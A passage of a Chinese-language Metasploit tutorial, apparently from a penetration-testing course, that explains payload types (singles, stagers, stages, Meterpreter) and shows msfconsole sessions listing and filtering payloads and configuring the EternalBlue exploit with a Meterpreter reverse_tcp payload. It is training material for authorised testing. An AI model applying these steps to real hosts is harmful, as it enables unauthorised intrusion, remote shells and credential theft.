class="line"></span><br><span class="line">target =&gt; 6</span><br></pre></td></tr></table></figure>

<h3 id="目标类型"><a href="#目标类型" class="headerlink" title="目标类型"></a>目标类型</h3><p>目标类型多种多样。每个目标都可能因服务包、操作系统版本甚至语言版本而异。这完全取决于目标或漏洞利用模块中的返回地址和其他参数。</p>
<p>返回地址可能会有所不同，因为特定的语言包更改了地址，有不同的软件版本可用，或者地址因挂钩而移动。这完全取决于识别目标所需的返回地址类型。该地址可以是<code>jmp esp</code>，跳转到标识目标的特定寄存器，或<code>pop/pop/ret</code>. 有关返回地址主题的更多信息，请参阅<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/89/section/931">Windows x86</a>模块上基于堆栈的缓冲区溢出。利用模块代码中的注释可以帮助我们确定目标的定义。</p>
<p>要正确识别目标，我们需要：</p>
<ul>
<li>获取目标二进制文件的副本</li>
<li>使用 msfpescan 找到合适的返回地址</li>
</ul>
<p>在本模块的后面，我们将更深入地研究漏洞利用开发、有效负载生成和目标识别。</p>
<h2 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>Metasploit 中的A<code>Payload</code>指的是帮助漏洞利用模块（通常）将 shell 返回给攻击者的模块。有效载荷与漏洞本身一起发送，以绕过易受攻击服务的标准功能程序 ( <code>exploits job</code>)，然后在目标操作系统上运行，通常向攻击者返回反向连接并建立立足点 ( <code>payload&#39;s job</code>)。</p>
<p>Metasploit 框架中有三种不同类型的有效载荷模块：Singles、Stagers 和 Stages。使用三种有效载荷交互类型将被证明对渗透测试者有益。它可以提供我们执行某些类型任务所需的灵活性。有效载荷是否暂存由<code>/</code>有效载荷名称表示。</p>
<p>例如，<code>windows/shell_bind_tcp</code>是一个没有阶段的单个有效载荷，而<code>windows/shell/bind_tcp</code>由一个 stager ( <code>bind_tcp</code>) 和一个阶段 ( <code>shell</code>) 组成。</p>
<h3 id="Singles"><a href="#Singles" class="headerlink" title="Singles"></a>Singles</h3><p>有效负载<code>Single</code>包含所选任务的漏洞和整个 shellcode。内联有效载荷在设计上比同类有效载荷更稳定，因为它们包含所有内容。然而，一些漏洞利用将不支持这些有效负载的最终大小，因为它们可能会变得非常大。<code>Singles</code>是独立的有效载荷。它们是在目标系统上发送和执行的唯一对象，运行后立即得到结果。单个有效负载可以像将用户添加到目标系统或启动进程一样简单。</p>
<h3 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h3><p><code>Stager</code>payloads 与 Stage payloads 一起工作来执行特定的任务。一个 Stager 在攻击者机器上等待，准备在该阶段在远程主机上完成运行后与受害主机建立连接。<code>Stagers</code>通常用于在攻击者和受害者之间建立网络连接，并且设计得小巧可靠。Metasploit 将使用最好的一个，并在必要时退回到不太喜欢的那个。</p>
<p>Windows NX 与 NO-NX Stagers</p>
<ul>
<li>NX CPU 和 DEP 的可靠性问题</li>
<li>NX stagers 更大（VirtualAlloc 内存）</li>
<li>现在默认为 NX + Win7 兼容</li>
</ul>
<h3 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h3><p><code>Stages</code>是由 stager 的模块下载的有效负载组件。各种有效负载阶段提供没有大小限制的高级功能，例如 Meterpreter、VNC 注入等。有效载荷阶段自动使用中间阶段：</p>
<ul>
<li>一个单一的<code>recv()</code>失败与大的有效载荷</li>
<li>Stager 接收中间 stager</li>
<li>中间的 Stager 然后执行完整的下载</li>
<li>对 RWX 也更好</li>
</ul>
<h2 id="分阶段有效载荷"><a href="#分阶段有效载荷" class="headerlink" title="分阶段有效载荷"></a>分阶段有效载荷</h2><p>简单地说，分阶段有效载荷是一种<code>exploitation process</code>模块化且功能分离的有效载荷，有助于将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但致力于将攻击链接在一起。如果所有阶段都正常工作，这最终将授予攻击者远程访问目标机器的权限。</p>
<p>与任何其他有效负载一样，除了授予对目标系统的 shell 访问权限外，此有效负载的范围应尽可能紧凑和不显眼，以尽可能地帮助防病毒 () &#x2F; 入侵防御系统 () 规避<code>AV</code>。<code>IPS</code></p>
<p><code>Stage0</code>分段有效载荷的一部分表示通过网络发送到目标机器易受攻击的服务的初始 shellcode，其唯一目的是初始化与攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会遇到这些通用名称<code>reverse_tcp</code>、<code>reverse_https</code>和<code>bind_tcp</code>。例如，在<code>show payloads</code>命令下，您可以查找如下所示的有效负载：</p>
<h4 id="MSF-分阶段有效载荷"><a href="#MSF-分阶段有效载荷" class="headerlink" title="MSF - 分阶段有效载荷"></a>MSF - 分阶段有效载荷</h4><p> MSF - 分阶段有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>​	反向连接不太可能触发预防系统，例如初始化连接的是受害者主机，该主机大部分时间驻留在所谓的<code>security trust zone</code>. 然而，当然，网络的安全设备和人员不会盲目地遵循这种信任策略，因此即使是在这一步，攻击者也必须谨慎行事。</p>
<p>​	Stage0 代码还旨在在到达后将更大的后续有效负载读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的有效载荷阶段，这应该授予他们 shell 访问权限。这个更大的有效载荷将是<code>Stage1</code>有效载荷。我们将在后面的部分中进行更详细的介绍。</p>
<h4 id="Meterpreter-载荷"><a href="#Meterpreter-载荷" class="headerlink" title="Meterpreter 载荷"></a>Meterpreter 载荷</h4><p>有效载荷<code>Meterpreter</code>是一种特定类型的多面有效载荷，用于<code>DLL injection</code>确保与受害主机的连接稳定，难以通过简单检查检测到，并在重启或系统更改后保持不变。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。此外，脚本和插件可以<code>loaded and unloaded</code>根据需要动态配置。</p>
<p>一旦执行了 Meterpreter 负载，就会创建一个新会话，它会生成 Meterpreter 接口。它与 msfconsole 界面非常相似，但所有可用的命令都是针对目标系统的，有效负载已“感染”该系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的部分中深入研究有关 Meterpreter 的更多细节。</p>
<p>使用 Meterpreter，我们还可以<code>load</code>在不同的 Plugins 中协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。</p>
<h2 id="搜索有效载荷"><a href="#搜索有效载荷" class="headerlink" title="搜索有效载荷"></a>搜索有效载荷</h2><p>​	要选择我们的第一个有效载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要访问持久化，我们可能会想要选择一个 Meterpreter 负载。</p>
<p>如上所述，Meterpreter 有效负载为我们提供了极大的灵活性。它们的基本功能已经非常广泛且具有影响力。我们可以自动化并快速交付与渗透测试的<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">GentilKiwi 的 Mimikatz 插件</a>等插件相结合的部分，同时保持有组织、高效的评估。要查看所有可用的有效负载，请使用<code>show payloads</code>中的命令<code>msfconsole</code>。</p>
<h4 id="MSF-列出有效载荷"><a href="#MSF-列出有效载荷" class="headerlink" title="MSF - 列出有效载荷"></a>MSF - 列出有效载荷</h4><p> MSF - 列出有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   #    Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">-    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd</span><br><span class="line">   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br><span class="line">   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager</span><br><span class="line">   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager</span><br><span class="line">   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager</span><br><span class="line">   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline</span><br><span class="line">   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline</span><br><span class="line">   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline</span><br><span class="line">   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager</span><br><span class="line">   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager</span><br><span class="line">   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager</span><br><span class="line">   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline</span><br><span class="line">   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">   </span><br><span class="line">   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager</span><br><span class="line">   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</span><br></pre></td></tr></table></figure>

<p>​	如上所示，有很多可用的有效载荷可供选择。不仅如此，我们还可以使用创建我们的有效载荷<code>msfvenom</code>，但我们稍后会深入探讨。我们将使用与以前相同的目标，而不是使用默认的有效载荷，这是一个简单的<code>reverse_tcp_shell</code>，我们将使用一个<code>Meterpreter Payload for Windows 7(x64)</code>.</p>
<p>滚动上面的列表，我们找到包含<code>Meterpreter Payloads for Windows(x64)</code>.</p>
<p> MSF - 列出有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line">529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)</span><br><span class="line">530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)</span><br><span class="line">531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)</span><br><span class="line">532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)</span><br><span class="line">533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)</span><br><span class="line">534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64</span><br></pre></td></tr></table></figure>

<p>正如我们所见，在如此庞大的列表中找到所需的有效负载可能非常耗时。我们还可以使用<code>grep</code>in<code>msfconsole</code>来过滤掉特定的术语。这将加快搜索速度，从而加快我们的选择速度。</p>
<p>我们必须<code>grep</code>在开头输入带有相应参数的命令，然后输入要进行过滤的命令。例如，让我们假设我们希望为我们的漏洞利用处理一个<code>TCP</code>基础。因此，我们可以首先搜索有效负载中包含该词的所有结果。<code>reverse shell``Meterpreter``Meterpreter</code></p>
<h4 id="MSF-搜索特定有效载荷"><a href="#MSF-搜索特定有效载荷" class="headerlink" title="MSF - 搜索特定有效载荷"></a>MSF - 搜索特定有效载荷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads</span><br><span class="line"></span><br><span class="line">   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads</span><br><span class="line"></span><br><span class="line">[*] 14</span><br></pre></td></tr></table></figure>

<p>这给了我们一个总的<code>14</code>结果。现在我们可以在第一个命令之后添加另一个<code>grep</code>命令并搜索<code>reverse_tcp</code>.</p>
<p> MSF - 搜索特定有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">[*] 3</span><br></pre></td></tr></table></figure>

<p>在 的帮助下<code>grep</code>，我们将我们想要的有效载荷列表减少到更少。当然，该<code>grep</code>命令可用于所有其他命令。我们只需要知道我们在寻找什么。</p>
<h2 id="选择有效载荷"><a href="#选择有效载荷" class="headerlink" title="选择有效载荷"></a>选择有效载荷</h2><p>与模块一样，我们需要我们想要使用的条目的索引号。要为当前选定的模块设置有效负载，我们<code>set payload &lt;no.&gt;</code>仅在选择一个漏洞利用模块后才使用。</p>
<h4 id="MSF-选择负载"><a href="#MSF-选择负载" class="headerlink" title="MSF - 选择负载"></a>MSF - 选择负载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>选择有效载荷后，我们将有更多选择。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure>

<p>正如我们所见，通过<code>show payloads</code>在 Exploit 模块本身中运行命令，msfconsole 检测到目标是 Windows 机器，因此只显示针对 Windows 操作系统的有效负载。</p>
<p>我们还可以看到出现了一个新的选项字段，它与有效负载参数将包含的内容直接相关。我们将关注<code>LHOST</code>和<code>LPORT</code>（我们的攻击者 IP 和反向连接初始化所需的端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新发起攻击。</p>
<h2 id="使用负载"><a href="#使用负载" class="headerlink" title="使用负载"></a>使用负载</h2><p>是时候为 Exploit 模块和 payload 模块设置我们的参数了。对于利用部分，我们需要设置以下内容：</p>
<table>
<thead>
<tr>
<th><strong>范围</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>RHOSTS</code></td>
<td>远程主机的 IP 地址，目标机器。</td>
</tr>
<tr>
<td><code>RPORT</code></td>
<td>不需要更改，只需检查我们是否在运行 SMB 的端口 445 上。</td>
</tr>
</tbody></table>
<p>对于有效负载部分，我们需要设置以下内容：</p>
<table>
